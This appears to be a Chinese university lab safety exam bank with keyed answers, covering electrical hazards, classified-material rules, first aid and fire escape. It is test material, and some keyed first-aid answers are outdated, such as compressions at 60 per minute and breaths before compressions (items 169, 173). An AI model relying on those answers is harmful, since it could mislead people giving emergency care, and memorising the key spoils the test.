<p>​     137、[判断题] <strong>为方便进出专人管理的设备房间，可自行配制钥匙。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     138、[判断题] <strong>国家秘密载体是指以文字、数据、符号、图形、图像、声音等方式记载国家秘密信息的纸介质、磁介质、光盘等各类物品。磁介质载体包括计算机硬盘、软盘和录音带、录像带等。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     139、[判断题] <strong>学生进入实验室学习、工作前应接受安全教育、培训，并通过考核。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     140、[判断题] <strong>禁止邮寄属于国家秘密的文件、资料和其他物品出境，禁止非法携运属于国家秘密的文件、资料和其他物品出境。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     141、[判断题] <strong>实验室应保持整洁有序，不准喧哗、打闹、抽烟。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     142、[判断题] <strong>在遇到高压电线断落地面时，导线断落点20米内，禁止人员进入。如果不慎在此范围内，应背朝电线断落点，采用单脚跳或双脚并跳，撤离现场。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     143、[判断题] <strong>一定强度的电场，磁场，电磁场都可能对人有损害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     144、[判断题] <strong>使用电气设备时可以用两眼插头代替三眼插头。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     145、[判断题] <strong>不使用绝缘损坏或接地不良的电气设备。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     146、[判断题] <strong>负载处于工作状态时，可以插、拔、接电气线路。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     147、[判断题] <strong>接线时，要用合格的电源线，电源插头、插座。电源线接头要用绝缘胶布包好。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     148、[判断题] <strong>可以用湿布擦电源开关。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     149、[判断题] <strong>进行电气维修必须先关掉电源,在设置告知牌后，方可进行。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     150、[判断题] <strong>实验室的电源总闸没有必要每天离开时都关闭，只要关闭常用电气的电源即可。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     151、[判断题] <strong>电源插座附近不应堆放易燃物等杂物。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     152、[判断题] <strong>移动某些非固定安装的电气设备时(如电风扇，照明灯)，可以不必切断电源。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     153、[判断题] <strong>任何电气设备在未验明无电时，一律认为有电，不能盲目触及。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     154、[判断题] <strong>当断线落地或大电流从接地装置流入大地时，若人站在附近则可能在两脚之间产生跨步电压。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     155、[判断题] <strong>人体触电致死，是由于肝脏受到严重伤害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     156、[判断题] <strong>实验室不得乱拉电线，套接接线板。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     157、[判断题] <strong>实验中遇到严重割伤，可在伤口上部10cm处用沙布扎紧，减慢流血，并立即送医院。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     158、[判断题] <strong>人工呼吸的方法是捏紧伤者鼻孔，深吸一口气后紧贴伤者的口向口内吹气，时间约为2秒钟，吹气完毕后，立即松开伤者的鼻孔，让他自行呼气，时间约3秒钟。如此以每分钟约12次的速度进行。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     159、[判断题] <strong>用手搬运重物时，应先以半蹲姿势，抓牢重物，然后用腿肌出力站起，切勿弯腰，以防伤及背部和腰。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     160、[判断题] <strong>电气设备和大型仪器须接地良好，对电线老化等隐患要定期检查并及时排除。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     161、[判断题] <strong>因实验需要，仪器设备可以随便拆装。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     162、[判断题] <strong>实验室应对仪器设备加强维护保养,定期校验和检修。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     163、[判断题] <strong>不准在车间打闹，不准随意攀登吊车、墙梯或者其它设备，不准在吊车吊运物体运行线上行走或停留。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     164、[判断题] <strong>使用电子门禁的大楼和实验室，应对各类人员设置相应的级别，对于门禁卡丢失、人员调动或离校等情况应及时采取措施，办理报失或移交手续。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     165、[判断题] <strong>实验室的接线板远离可能有水的位置和高温环境。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     166、[判断题] <strong>有关涉密的文件、资料的制作、保管建立病毒防护系统后可上网。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     167、[判断题] <strong>实验室安全与卫生工作应坚持“安全第一，预防为主”的原则。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     168、[判断题] <strong>在开放实验室，外来人员可随便操作实验室仪器设备。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     169、[判断题] <strong>胸外心脏挤压法：救护者跪在触电者一侧或骑跪在其腰部两侧，两手相迭，手掌根部放在伤者心窝上方、胸骨下，掌根用力垂直向下挤压，压出心脏里面的血液，挤压后迅速松开，胸部自动复原，血液充满心脏，以每分钟60次速度进行。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     170、[判断题] <strong>心脏骤停者应立即行胸外心脏按摩术，同时拨打120。现场抢救成功的心肺复苏患者或重症患者，如昏迷、惊厥、休克、深度青紫等，应立即送医院治疗。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     171、[判断题] <strong>实验中遇到一般割伤，应立即取出伤口内的异物，保持伤口干净，并用酒精棉清除伤口周围的污物，涂上外伤膏或消炎粉。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     172、[判断题] <strong>突发性不可抗拒的雷电、水灾、地震、房屋垮塌等自然灾害事故发生后，应在领导小组的指挥下，马上组织疏散、抢救现场工作人员或进行人员自助自救，以确保人员的人身安全，作好善后工作。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     173、[判断题] <strong>触电时，不可人去拉（可用木棒把伤员挑开），应立即切断电源，然后先做人工呼吸，再做心脏按压，同时报120送医院进行处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     174、[判断题] <strong>火或热水等引起的大面积烧伤、烫伤，必须用湿毛巾、湿布、湿棉被覆盖，然后送医院进行处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     175、[判断题] <strong>火或热水等引起的小面积烧伤、烫伤，必须用冷水冲洗30分钟以上，然后用烧伤膏涂抹，切不可用牙膏、酱油、盐等覆盖。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     176、[判断题] <strong>实施急救的顺序：若有呼吸心跳停止的，先行复苏，然后是止血、包扎、骨折固定或脱臼复位（固定）、搬运。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     177、[判断题] <strong>某人因机械操作不慎，致使左手食指从指根完全离断，急救处理首先是找器皿保存断指，然后包扎残端伤口止血。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     178、[判断题] <strong>急救时伤口包扎松劲适度，不可过紧或过松，以防滑脱或压迫神经和血管，影响远端血液循环，甚至造成肢体坏死。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     179、[判断题] <strong>急救时伤口包扎越紧越好。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     180、[判断题] <strong>发生意外后先对伤员进行必要的止血、包扎、固定等处理，然后尽可能用担架搬运，搬运时病人始终处脚朝前，头朝后，以便于随时观察伤者情况变化，及时实施急救处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     181、[判断题] <strong>护送病人时，应取掉口中异物，采用平卧位，头部稍低，保持呼吸畅通。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     182、[判断题] <strong>未经指导教师许可，不得搬弄仪器、设备，以及擅自开始实验。实验时，应注意安全，按要求操作，如发现异常立即停止。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     183、[判断题] <strong>空调电源必须单独拉线，不得使用接线板。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     184、[判断题] <strong>不得带着实验防护手套开门、翻阅书籍、使用电脑。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     185、[判断题] <strong>除非特殊需要并采取一定的安全保护措施，否则空调、计算机、饮水机等不得无人开机过夜。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     186、[判断题] <strong>实验室内电源根据需要可自行拆装、改线。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     187、[判断题] <strong>实验室钥匙的配发由实验室负责人管理，不得私自配置钥匙或借给他人使用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     188、[判断题] <strong>不得堵塞实验室逃生通道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     189、[判断题] <strong>普通实验室内，不得私自饲养实验动物。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     190、[判断题] <strong>实验室人员必须定期检查设备、水电线路、门窗等是否完好，如发现问题，必须及时进行维修。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     191、[判断题] <strong>遇到停电停水等情况，实验室人员必须检查电源和水源是否关闭，避免重新来电来水时发生相关安全事故。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     192、[判断题] <strong>实验室门口应挂上写有安全责任人的姓名和联系方式的牌子。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     193、[判断题] <strong>实验室应将相应的规章制度和操作规程挂到墙上或便于取阅的地方。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     194、[判断题] <strong>实验室内可以使用木制配电板、闸刀开关、花线电线。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     195、[判断题] <strong>仪器设备发生故障后，必须及时报告管理人员，并详细登记。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     196、[判断题] <strong>各学院每季度组织有关人员对实验室进行安全与卫生管理的例行检查，记录检查情况，提出存在的问题并限时整改。每次检查结束后须将检查结果形成报告，上报实验室处。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     197、[判断题] <strong>实验室地面出现溢水的主要原因之一是忘记关闭水龙头，尤其停水时忘关水龙头，因此离开实验室时要认真检查。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     198、[判断题] <strong>实验室如发现存在安全隐患，要及时向所在学院和实验室负责人、保卫处、实验室处报告，并采取措施进行整改。对安全隐患隐瞒不报或拖延上报的，学校将对相关责任人进行严肃处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     199、[判断题] <strong>夏季天气热时可以在实验室内穿露有脚趾的鞋。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     200、[判断题] <strong>实验室安全与卫生检查内容主要包括实验室布置、卫生、水电安全、冰箱与烘箱使用管理、危险品使用与保管、化学与生物废弃物（气、液、固态物）的处置、排污管理、气体钢瓶安全、放射性安全等。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     201、[判断题] <strong>要加强实验室排污处理装置（系统）的建设和管理，做到达标排放。实验废弃物不得倒入自来水下水道或普通垃圾箱等处。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     202、[判断题] <strong>应增强信息安全的意识，注意保护教学科研活动中实验技术参数、观测数据、实验分析结果及新的科学发现等资料。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     203、[判断题] <strong>建立健全安全管理规章制度，完善逐级安全责任制，贯彻执行“谁使用，谁管理”、“谁主管，谁负责”的安全工作原则。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     204、[判断题] <strong>实验室内彼此保持安静，不得进行娱乐活动。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     205、[判断题] <strong>与工作无关的外来人员不得进入实验室。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     206、[判断题] <strong>任何单位和个人不得在电子公告系统、聊天室、网络新闻组上发布、谈论和传播国家秘密信息。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     207、[判断题] <strong>上网信息的保密管理坚持“谁上网谁负责”的原则。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     208、[单选题]<strong>消防车和消火栓的颜色是：</strong> （分值1.0）</p>
<ul>
<li>A、白色<br> B、黄色<br> C、红色</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     209、[单选题]<strong>可以用水扑灭的火灾是下列哪种物质？</strong> （分值1.0）</p>
<ul>
<li>A、油类起火<br> B、酒精起火<br> C、电器起火<br> D、棉被起火</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     210、[单选题]<strong>在火灾逃生方法中，以下不正确的是：</strong> （分值1.0）</p>
<ul>
<li>A、用湿毛巾捂着嘴巴和鼻子<br> B、弯着身子快速跑到安全地点<br> C、躲在床底下，等待消防人员救援<br> D、马上从最近的消防通道跑到安全地点</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     211、[单选题]<strong>灭火的四种方法是：</strong> （分值1.0）</p>
<ul>
<li>A、捂盖法、扑打法、浇水法、隔开法<br> B、扑灭法、救火法、化学法、泡沫法<br> C、隔离法、窒息法、冷却法、化学抑制法</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     212、[单选题]<strong>在火灾初发阶段，应采取哪种方法撤离？</strong> （分值1.0）</p>
<ul>
<li>A、乘坐电梯<br> B、用湿毛巾捂住口鼻低姿从安全通道撤离<br> C、跳楼逃生<br> D、跑到楼顶呼救</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     213、[单选题]<strong>我国消防工作的方针是：</strong> （分值1.0）</p>
<ul>
<li>A、群防群治<br> B、遏制种特大火灾<br> C、预防为主，防消结合</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     214、[单选题]<strong>窒息灭火法是将氧气浓度降低至最低限度，以防止火势继续扩大。其主要工具是：</strong> （分值1.0）</p>
<ul>
<li>A、砂子<br> B、水<br> C、二氧化碳灭火器<br> D、干粉灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     215、[单选题]<strong>我国消防宣传活动日是每年的</strong> （分值1.0）</p>
<ul>
<li>A、11月9日<br> B、1月19日<br> C、9月11日<br> D、9月10日</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     216、[单选题]<strong>被火困在室内,如何逃生？</strong> （分值1.0）</p>
<ul>
<li>A、跳楼<br> B、到窗口或阳台挥动物品求救、用床单或绳子拴在室内牢固处下到 下一层逃生<br> C、躲到床下,等待救援<br> D、打开门,冲出去</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     217、[单选题]<strong>实验大楼因出现火情发生浓烟已穿入实验室内时，以下哪种行为是正确的？</strong> （分值1.0）</p>
<ul>
<li>A、沿地面匍匐前进，当逃到门口时，不要站立开门<br> B、打开实验室门后不用随手关门<br> C、从楼上向楼下外逃时可以乘电梯</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     218、[单选题]<strong>楼内失火应( )</strong> （分值1.0）</p>
<ul>
<li>A、从疏散通道逃离<br> B、乘坐电梯逃离<br> C、在现场等待救援<br> D、见到门口就跑</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     219、[单选题]<strong>任何单位（ ）都有参加组织的灭火工作的义务。</strong> （分值1.0）</p>
<ul>
<li>A、男性公民<br> B、成年公民<br> C、包括少年儿童在内的所有人员</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     220、[单选题]<strong>在室外灭火时，应站在什么位置 ？</strong> （分值1.0）</p>
<ul>
<li>A、上风<br> B、下风<br> C、随便哪里</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     221、[单选题]<strong>火灾蔓延的途径是:</strong> （分值1.0）</p>
<ul>
<li>A、热传导<br> B、热对流<br> C、热辐射<br> D、以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     222、[单选题]<strong>火灾初起阶段是扑救火灾( )的阶段。</strong> （分值1.0）</p>
<ul>
<li>A、最不利<br> B、最有利<br> C、较不利</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     223、[单选题]<strong>扑救电气设备火灾时，不能用什么灭火器?</strong> （分值1.0）</p>
<ul>
<li>A、四氯化碳灭火器<br> B、二氧化碳灭火器<br> C、泡沫灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     224、[单选题]<strong>发生火灾时，正确的安全疏散主要有三个方向，向下可以跑到地面，向上可以爬到屋顶，还可以（）</strong> （分值1.0）</p>
<ul>
<li>A、躲到角落里<br> B、向外逃到阳台<br> C、钻到阁楼、大橱等处避难</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     225、[单选题]<strong>干粉灭火器适用于：</strong> （分值1.0）</p>
<ul>
<li>A、电器起火<br> B、可燃气体起火<br> C、有机溶剂起火<br> D、以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     226、[单选题]<strong>引起电器线路火灾的原因是：</strong> （分值1.0）</p>
<ul>
<li>A. 短路<br> B. 电火花<br> C. 负荷过载<br> D．以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     227、[单选题]<strong>使用灭火器扑救火灾时要对准火焰的什么部位喷射。</strong> （分值1.0）</p>
<ul>
<li>A. 上部<br> B. 中部<br> C. 根部<br> D. 中上部</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     228、[单选题]<strong>下列哪项不是影响混合物爆炸极限的因素?</strong> （分值1.0）</p>
<ul>
<li>A. 混合物的温度、压力<br> B. 混合物的多少<br> C. 混合物的含氧量<br> D. 容器的大小</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     229、[单选题]<strong>下列选项中属于防爆的措施有：</strong> （分值1.0）</p>
<ul>
<li>A. 防止形成爆炸性混合物的化学品泄漏<br> B. 控制可燃物形成爆炸性混合物<br> C. 消除火源、安装检测和报警装置<br> D. 以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     230、[单选题]<strong>窒息灭火法是将氧气浓度降低至最低限度，以防止火势继续扩大。其主要工具是：</strong> （分值1.0）</p>
<ul>
<li>A. 砂子<br> B. 水<br> C. 二氧化碳灭火器<br> D. 干粉灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     231、[单选题]<strong>采取适当的措施，使燃烧因缺乏或隔绝氧气而熄灭，这种方法称作:</strong> （分值1.0）</p>
<ul>
<li>A. 窒息灭火法<br> B. 隔离灭火法<br> C. 冷却灭火法</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     232、[单选题]<strong>身上着火后,下列哪种灭火方法是错误的？</strong> （分值1.0）</p>
<ul>
<li>A. 就地打滚<br> B. 用厚重衣物覆盖压灭火苗<br> C. 迎风快跑<br> D. 大量水冲或跳入水中</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     233、[单选题]<strong>在火灾逃生方法中，以下不正确的是：</strong> （分值1.0）</p>
<ul>
<li>A.用湿毛巾捂着嘴巴和鼻子??????<br> B.弯着身子快速跑到安全地点<br> C.躲在床底下，等待消防人员救援?<br> D.马上从最近的消防通道跑到安全地点。</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     234、[单选题]<strong>实验室仪器设备用电或线路发生故障着火时，应立即     ，并组织人员用灭火器进行灭火。</strong> （分值1.0）</p>
<ul>
<li>A．将贵重仪器设备迅速转移<br> B．切断现场电源<br> C．将人员疏散</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     235、[单选题]<strong>如果实验出现火情，要立即：</strong> （分值1.0）</p>
<ul>
<li>A．停止加热，移开可燃物，切断电源，用灭火器灭火<br> B．打开实验室门，尽快疏散、撤离人员<br> C．用干毛巾覆盖上火源，使火焰熄灭</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     236、[单选题]<strong>实验大楼因出现火情发生浓烟已穿入实验室内时，以下哪种行为是正确的？</strong> （分值1.0）</p>
<ul>
<li> A．沿地面匍匐前进，当逃到门口时，不要站立开门<br> B．打开实验室门后不用随手关门<br> C．从楼上向楼下外逃时可以乘电梯</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     237、[单选题]<strong>实验大楼安全出口的疏散门应：</strong> （分值1.0）</p>
<ul>
<li>A. 自由开启<br> B. 向外开启<br> C. 向内开启<br> D. 关闭，需要时可自行开启</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     238、[单选题]<strong>身上着火，最好的做法是：</strong> （分值1.0）</p>
<ul>
<li>A. 就地打滚或用水冲<br> B. 奔跑<br> C. 大声呼救<br> D. 边跑边脱衣服</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     239、[单选题]<strong>在遇到高压电线断落地面时，导线断落点多少米内，禁止人员进入。</strong> （分值1.0）</p>
<ul>
<li>A．10<br> B．20<br> C．30<br> D. 50</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     240、[单选题]<strong>进行照明设施的接电操作，应采取的防触电措施为：</strong> （分值1.0）</p>
<ul>
<li>A. 湿手操作<br> B. 切断电源<br> C. 站在金属登子或梯子上<br> D. 戴上手套</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     241、[单选题]<strong>一般居民住宅、办公场所，若以防止触电为主要目的时，应选用漏电动作电流为多少的漏电保护开关？</strong> （分值1.0）</p>
<ul>
<li>A. 6 mA<br> B. 15mA<br> C. 30mA<br> D. 50mA</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     242、[单选题]<strong>发生触电事故的危险电压一般是?多少伏以上？</strong> （分值1.0）</p>
<ul>
<li>A．24<br> B．26<br> C．65<br> D. 110</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     243、[单选题]<strong>万一发生电气火灾，首先应该采取的第一条措施是：</strong> （分值1.0）</p>
<ul>
<li>A. 打电话报警<br> B. 切断电源<br> C. 扑灭明火<br> D. 求援</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     244、[单选题]<strong>在火灾初发阶段，应采取哪种方法撤离？</strong> （分值1.0）</p>
<ul>
<li>A. 乘坐电梯<br> B. 用湿毛巾捂住口鼻低姿从安全通道撤离<br> C. 跳楼逃生<br> D. 跑到楼顶呼救</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     245、[单选题]<strong>火灾发生时，湿毛巾折叠8层为宜，其烟雾浓度消除率可达：</strong> （分值1.0）</p>
<ul>
<li>A. 40%<br> B. 60%<br> C. 80%<br> D. 95%</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     246、[单选题]<strong>火灾蔓延的途径是:</strong> （分值1.0）</p>
<ul>
<li>A. 热传导<br> B. 热对流<br> C. 热辐射<br> D. 以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     247、[单选题]<strong>扑救易燃液体火灾时，应用那种方法？</strong> （分值1.0）</p>
<ul>
<li>A. 用灭火器<br> B. 用水泼<br> C. 扑打<br> D. 以上都可以 </li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     248、[单选题]<strong>扑灭电器火灾不宜使用下列何种灭火器材？</strong> （分值1.0）</p>
<ul>
<li>A. 二氧化碳灭火器<br> B. 干粉灭火器<br> C. 泡沫灭火器<br> D. 灭火砂</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     249、[单选题]<strong>实验室电器设备所引起的火灾，应：</strong> （分值1.0）</p>
<ul>
<li>A．用水灭火<br> B．用二氧化碳或干粉灭火器灭火<br> C．用泡沫灭火器灭火</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     250、[单选题]<strong>火灾发生时，湿毛巾折叠8层为宜，其烟雾浓度消除率可达：</strong> （分值1.0）</p>
<ul>
<li>A、40%<br> B、60%<br> C、80%<br> D、95</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     251、[单选题]<strong>当打开房门闻到燃气气味时，要迅速( )，以防止引起火灾。</strong> （分值1.0）</p>
<ul>
<li>A、打开燃气灶具查找漏气部位<br> B、打开门窗通风<br> C、立刻打电话给燃气公司</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     252、[单选题]<strong>下列不具备消防监督检查资格的是（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、公安消防机构<br> B、治安联防队<br> C、公安派出所</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     253、[单选题]<strong>当遇到火灾时，要迅速向（ ）逃生。</strong> （分值1.0）</p>
<ul>
<li>A、着火相反的方向<br> B、人员多的方向<br> C、安全出口的方向</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     254、[单选题]<strong>灭火器上的压力表用红、黄、绿三色表示灭火器的压力情况，当指针指在绿色区域表示：</strong> （分值1.0）</p>
<ul>
<li>A、正常<br> B、偏高<br> C、偏低</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     255、[单选题]<strong>由于行为人的过失引起火灾，造成严重后果的行为，构成（ ）</strong> （分值1.0）</p>
<ul>
<li>A、纵火罪<br> B、失火罪<br> C、重大责任事故罪</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     256、[单选题]<strong>实验室电器发生火灾，在没有灭火器的情况下应先：</strong> （分值1.0）</p>
<ul>
<li>A、用水扑救<br> B、用毛毯包裹<br> C、切断电源<br> D、用沙盘灭火</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     257、[单选题]<strong>我国大陆通用的火警电话号码是：</strong> （分值1.0）</p>
<ul>
<li>A、991<br> B、119<br> C、911</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     258、[单选题]<strong>从下列选项中选择万一发生电气火灾后首先应该采取的第一条措施</strong> （分值1.0）</p>
<ul>
<li>A、打电话报警<br> B、切断电源<br> C、扑灭明火<br> D、保护现场，分析火因，以便采取措施，杜绝隐患</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     259、[单选题]<strong>有机物或能与水发生剧烈化学反应的药品着火，应用 （ ），以免扑救不当造成更大损害。</strong> （分值1.0）</p>
<ul>
<li>A、其他有机物灭火<br> B、自来水灭火<br> C、灭火器或沙子扑灭</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     260、[单选题]<strong>阻拦报火警或者谎报火警的给予（ ）处罚。</strong> （分值1.0）</p>
<ul>
<li>A、劳动教养<br> B、撤掉其电话<br> C、警告、罚款或者十日以下拘留</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     261、[单选题]<strong>违反《中华人民共和国消防法》行为，构成犯罪的，应：</strong> （分值1.0）</p>
<ul>
<li>A、依法给予行政处罚<br> B、依法追究刑事责任<br> C、给予罚款或拘留</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     262、[单选题]<strong>学校教学楼应配备的灭火器型号是（ ）</strong> （分值1.0）</p>
<ul>
<li>A、ABC干粉灭火器<br> B、BC干粉灭火器<br> C、泡沫灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     263、[单选题]<strong>泡沫灭火器不能用于扑救 （ ）火灾。</strong> （分值1.0）</p>
<ul>
<li>A、塑料<br> B、汽油<br> C、金属钠</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     264、[单选题]<strong>《中华人民共和国消防法》自（ ）起施行。</strong> （分值1.0）</p>
<ul>
<li>A、1997年<br> B、1998年<br> C、2000年</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     265、[单选题]<strong>火场逃生的原则是 ( ) 。</strong> （分值1.0）</p>
<ul>
<li>A、抢救国家财产为上<br> B、先带上日后生活必需钱财要紧<br> C、安全撤离、救助结合<br> D、逃命要紧</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
